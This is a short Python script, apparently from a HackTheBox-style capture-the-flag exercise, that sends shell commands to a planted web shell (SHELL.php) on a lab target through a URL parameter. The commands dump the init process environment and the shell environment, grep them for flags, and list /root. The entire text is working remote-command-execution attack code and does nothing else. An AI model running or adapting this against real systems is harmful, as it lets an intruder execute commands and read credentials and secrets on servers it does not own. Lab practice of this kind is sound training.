import urllib.request, urllib.parse

# Test each part separately
parts = [
    'cat /proc/1/environ 2>/dev/null | tr "\\0" "\\n" | grep -i flag; echo X1',
    'env | grep -i flag; echo X2',
    'ls /root/ 2>&1; echo X3',
]
for p in parts:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": p})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result:
            print(f"Result: {result[:300]}")
    except Exception as e:
        print(f"Error: {e}")
